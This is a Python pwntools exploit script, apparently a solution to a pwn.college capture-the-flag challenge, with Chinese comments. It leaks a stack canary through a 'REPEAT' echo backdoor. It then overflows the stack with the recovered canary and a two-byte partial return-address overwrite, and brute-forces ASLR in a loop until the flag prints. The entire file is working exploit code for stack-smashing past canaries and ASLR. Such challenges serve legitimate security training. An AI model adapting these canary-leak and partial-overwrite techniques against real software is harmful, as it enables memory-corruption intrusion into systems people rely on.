import sys
import itertools

from pwn import *

context.log_level = "error"

# recursive same canary
def exploit():
    p = process("/challenge/recursive-ruin-easy")

    try:
        # Phase 1: 触发后门并泄露 Canary
        p.sendlineafter(b"Payload size:", b"137") # buffer to canary

        # 构造 Payload 1: 'REPEAT' + padding + 1 byte 覆盖 Canary 的 \x00
        # 136 字节刚好到 canary，第 137 字节 (b'X') 覆盖掉 \x00
        payload1 = b"REPEAT".ljust(136, b"A") + b"X"
        p.sendafter(b"bytes)!\n", payload1)

        # 接收泄露的数据
        p.recvuntil(b"You said: ")
        p.recv(137)  # 略过我们发送的 payload
        leaked_canary = p.recv(7)
        canary = b"\x00" + leaked_canary

        # Phase 2: 第二次 challenge() 进行栈溢出
        # 距离 rip 是 152 bytes，我们要覆盖 2 bytes，所以总大小 154
        p.sendlineafter(b"Payload size:", b"154")

        # 构造 Payload 2: Padding + 真实的 Canary + Dummy RBP + 2 Bytes RIP 覆盖
        # 这里假设第 4 个 nibble 猜的是 8 (即 \xb3\x83)，不行的话脚本会自己重试
        payload2 = b"A" * 136 + canary + b"B" * 8 + b"\xb3\x83"
        p.sendafter(b"bytes)!\n", payload2)

        result = p.recvall(timeout=1)
        if b"flag{" in result or b"pwn.college{" in result:
            print("\n[+] Success!")
            print(result.decode())
            return True

    except Exception as e:
        pass
    finally:
        p.close()

    return False

if __name__ == "__main__":
    for attempts in itertools.count():
        sys.stdout.write(f"\rAttempt: {attempts}")
        sys.stdout.flush()
        if exploit():
            break
